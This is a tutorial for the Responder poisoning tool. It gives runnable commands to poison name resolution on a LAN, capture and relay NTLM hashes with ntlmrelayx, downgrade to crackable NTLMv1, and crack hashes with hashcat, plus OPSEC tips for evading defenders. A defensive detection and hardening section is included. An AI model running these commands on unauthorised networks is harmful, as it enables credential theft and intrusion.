# Responder — full tutorial

`Responder` is an LLMNR / NBT-NS / mDNS poisoner. When a Windows host fails DNS, it broadcasts asking "anyone know X?". Responder replies "I do!" — the victim then attempts NTLM authentication to your machine, which captures the NetNTLMv1/v2 challenge-response.

## Install

```terminal
apt install responder
git clone https://github.com/lgandx/Responder
```

Run as root (it binds privileged ports).

## Core flags

| Flag | Purpose |
|------|---------|
| `-I <iface>` | Network interface to listen on |
| `-w` | Start the WPAD proxy (fake `wpad.dat`) |
| `-r` | Respond to NetBIOS workstation queries |
| `-d` | Respond to NetBIOS domain queries |
| `-f` | Fingerprint OS via NBT |
| `-v` | Verbose |
| `-A` | Analyze mode — listen-only, no responses (recon) |
| `-F` | Force NTLM auth (HTTP) regardless of UA |
| `-P` | Force basic auth on HTTP (capture cleartext if user ignores cert warning) |
| `-N` | Don't respond to specific names file |
| `--lm` | Force LM downgrade |
| `--disable-ess` | Disable extended session security (downgrade to NTLMv1) |
| `--external-ip` | Use external IP as poisoning answer |
| `-e <ip>` | Poison with this IP |
| `--basic` | Auth via Basic, easier captures |

## Configuration: `Responder.conf`

In `/usr/share/responder/Responder.conf` (or repo root) — most important keys:

```
[Responder Core]
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On
SNMP = On

Challenge = 1122334455667788   # Predictable challenge → cracking with rainbow tables
SessionLog = Responder-Session.log
```

The default servers (HTTP, SMB, FTP, ...) all capture credentials from any client that lands on them.

## Workflows

### Standard run

```terminal
sudo responder -I eth0 -dwv
```

`-d` poisons NetBIOS domain queries, `-w` runs WPAD, `-v` is verbose.

### Listen-only recon

```terminal
sudo responder -I eth0 -A
```

Tells you what would be poisonable without sending traffic. Great pre-engagement check.

### Pair with ntlmrelayx (the real attack)

Disable Responder's SMB and HTTP servers (they'd answer instead of relaying), then run ntlmrelayx separately:

```terminal
# Edit Responder.conf:
SMB = Off
HTTP = Off

sudo responder -I eth0 -dwv          # terminal 1
ntlmrelayx.py -tf targets.txt -smb2support --escalate-user alice    # terminal 2
```

### Force NTLMv1 downgrade for cracking with rainbow tables

```terminal
sudo responder -I eth0 -dwv --lm --disable-ess
```

NTLMv1 challenge `1122334455667788` is a known precomputed rainbow set → ~$25 GPU-day to recover any captured hash. Modern Windows defaults block this, but legacy hosts still respond.

## Good output

```
[*] [LLMNR]  Poisoned answer sent to 10.0.1.42 for name files-srv (REQUEST: A)
[SMB] NTLMv2-SSP Hash     : alice::CORP:1122334455667788:0F1E2D3C...:01010000...
[*] Skipping previously captured hash for CORP\alice
```

Save the captured hash, crack with hashcat:

```terminal
hashcat -m 5600 hashes.txt rockyou.txt
```

Or relay directly without cracking (faster, requires a target where SMB signing is OFF or relay-tolerant).

## Bad output and fixes

| Symptom | Cause | Fix |
|---------|-------|-----|
| Tool starts but no captures | Network has no broadcast traffic / very quiet hour | Wait, or trigger via PetitPotam to compelled coercion |
| Captures land but won't crack | Strong password | Use spraying / relay instead |
| Conflicts with running SMB | Local Samba bound to 445 | `systemctl stop smbd` |
| Fewer events than expected | LLMNR / mDNS / NBT disabled by GPO | Pivot to coerced auth (PetitPotam, dfscoerce, coercer) |
| `Hostnames poisoning failure` | Wrong interface | Verify with `ip a`, restart with `-I` correct |

## Defender's perspective

Responder is one of the **easiest detections**:

- A new IP responding to LLMNR (UDP 5355) / NBT-NS (UDP 137) on the LAN.
- HTTP server returning realm `WORKGROUP` / `CORP` for any URL.
- Sudden burst of NTLM auths from many hosts to one new IP.

Hardening:
- **Disable LLMNR** (GPO: `Computer Config → Admin Templates → Network → DNS Client → Turn Off Multicast Name Resolution = Enabled`).
- **Disable NBT-NS** per-NIC (`Disable NetBIOS over TCP/IP`).
- **Enable SMB signing required** everywhere — kills relay.
- **Authenticated honeyhost**: a fake host that replies LLMNR pings — any client trying NTLM to it = malicious.

## OPSEC

- Loud — tools fire constantly on a switch port. Acceptable in pentest scope, dangerous outside.
- Disable Responder modules you don't need, especially HTTP, to reduce port noise.
- Use a separate listener IP — defender's first instinct is "find the new IP that everyone authenticated to".
- Coordinate with `mitm6` (IPv6 DHCP poisoning, often more effective on modern networks) for combined attacks.

## Related tools

| Tool | Niche |
|------|-------|
| **Inveigh** | C# / PowerShell port of Responder (Windows operator) |
| **mitm6** | IPv6 DHCPv6 + DNS spoof (very effective in dual-stack) |
| **ntlmrelayx.py** | Relay end of the chain |
| **Pretender** | Modern Go alternative (mDNS / LLMNR / NBT-NS / DHCPv6) |
| **dnschef** | DNS spoofer for MITM |
